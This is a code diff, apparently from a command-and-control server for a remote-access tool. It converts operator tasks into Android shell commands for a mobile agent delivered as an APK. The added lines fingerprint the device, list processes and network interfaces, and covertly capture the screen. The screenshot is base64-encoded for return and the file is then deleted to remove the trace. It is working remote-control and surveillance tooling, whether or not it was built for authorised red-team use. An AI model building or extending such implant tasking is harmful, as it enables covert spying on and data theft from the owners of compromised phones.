@@ -269,10 +269,34 @@ deviceSeed := regReq.DeviceID
 
 	var mobileTasks []MobileTask
 	for _, t := range tasks {
+		taskType := protocol.TaskTypeName(t.Type)
+		command := strings.Join(t.Args, " ")
+
+		// Translate non-shell task types to shell commands for mobile agents.
+		// The mobile APK only understands "shell" — native task types like
+		// cd, sysinfo, ps, ifconfig need to be converted.
+		switch t.Type {
+		case protocol.TaskCd:
+			taskType = "shell"
+			command = "cd " + command
+		case protocol.TaskSysinfo:
+			taskType = "shell"
+			command = "id; getprop ro.product.model; getprop ro.build.version.release; uname -a"
+		case protocol.TaskProcessList:
+			taskType = "shell"
+			command = "ps -A"
+		case protocol.TaskIfconfig:
+			taskType = "shell"
+			command = "ip addr"
+		case protocol.TaskScreenshot:
+			taskType = "shell"
+			command = "screencap -p /sdcard/phantom_screen.png && base64 /sdcard/phantom_screen.png && rm /sdcard/phantom_screen.png"
+		}
+
 		mobileTasks = append(mobileTasks, MobileTask{
 			ID:      t.ID,
-			Type:    protocol.TaskTypeName(t.Type),
-			Command: strings.Join(t.Args, " "),
+			Type:    taskType,
+			Command: command,
 		})
 	}
 
